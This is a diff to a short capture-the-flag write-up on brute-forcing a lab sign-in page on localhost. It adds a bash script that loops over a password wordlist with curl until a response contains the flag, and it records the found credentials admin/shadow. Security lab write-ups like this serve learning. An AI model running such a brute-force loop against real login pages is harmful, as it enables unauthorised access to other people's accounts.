@@ -2,10 +2,10 @@
 
 ## Summary
 
-page: `http://localhost:8080/index.php?page=signin`
+page: `http://localhost:8081/index.php?page=signin`
 commands:
 ```bash
-curl "http://localhost:8080/index.php?page=signin&username=admin&password=shadow&Login=Login"
+curl "http://localhost:8081/index.php?page=signin&username=admin&password=shadow&Login=Login"
 ```
 Credentials: `admin` / `shadow` (brute-forced).
 
@@ -15,8 +15,18 @@ on the sign in page
 
 Used "admin" as the username
 to brute force the password... with this script
+```bash
+#!/bin/bash
+while IFS= read -r pass; do
+  result=$(curl -s "http://localhost:8081/index.php?page=signin&username=admin&password=$pass&Login=Login")
+  if echo "$result" | grep -qi "flag"; then
+    echo "FOUND: $pass"
+    echo "$result" | grep -i flag
+    break
+  fi
+done < Most-Popular-Letter-Passes.txt
 
-
+```
 
 So i got the flag:
 ```
